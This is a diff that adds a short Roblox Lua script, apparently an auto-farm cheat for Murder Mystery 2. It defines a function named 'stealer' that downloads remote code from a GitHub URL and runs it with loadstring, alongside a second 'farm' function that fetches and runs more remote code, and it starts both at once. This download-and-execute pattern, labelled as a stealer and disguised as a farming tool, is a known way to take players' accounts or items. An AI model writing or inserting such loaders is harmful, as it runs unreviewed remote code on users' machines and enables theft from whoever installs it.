@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Astonishpo/Mm2AutoFarm/refs/heads/main/Auto%20farm.lua'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
